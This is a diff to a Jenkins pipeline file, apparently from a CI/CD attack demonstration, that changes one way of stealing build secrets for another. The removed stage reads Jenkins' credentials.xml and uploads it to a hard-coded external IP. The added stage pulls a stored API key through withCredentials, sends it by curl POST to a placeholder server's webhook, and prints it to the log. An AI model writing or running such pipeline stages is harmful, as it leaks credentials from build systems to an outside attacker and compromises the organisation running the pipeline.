@@ -1,19 +1,22 @@
 node {
-  stage('Build Application') {
-        sh '''
+    stage('Build Application') {
+            sh '''
         npm install
         '''
-  }
-  stage('Deploy to Staging Environment') {
+    }
+    stage('Deploy to Staging Environment') {
+            sh '''
+            echo "Deploy to Staging"
+            '''
+    }
+    stage('Jenkins Credentials | Decrypt API KEY') {
+      withCredentials([string(credentialsId: '<copied-jenkins-api-id>',
+                              variable: 'secretText')]) {
+        apiKey = "\nAPI key: ${secretText}\n"
         sh '''
-        echo "Deploy to Staging"
+        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://<server-ip>:5000/webhook'
         '''
-  }
-      stage('Sensitive Information Disclosure') {
-        sh '''
-        rm info.txt | true
-        cat /var/lib/jenkins/credentials.xml >> info.txt
-        curl -i -X PUT http://35.219.174.240:5000/filewebhook --upload-file info.txt
-        '''
+      }
+      println apiKey
     }
 }
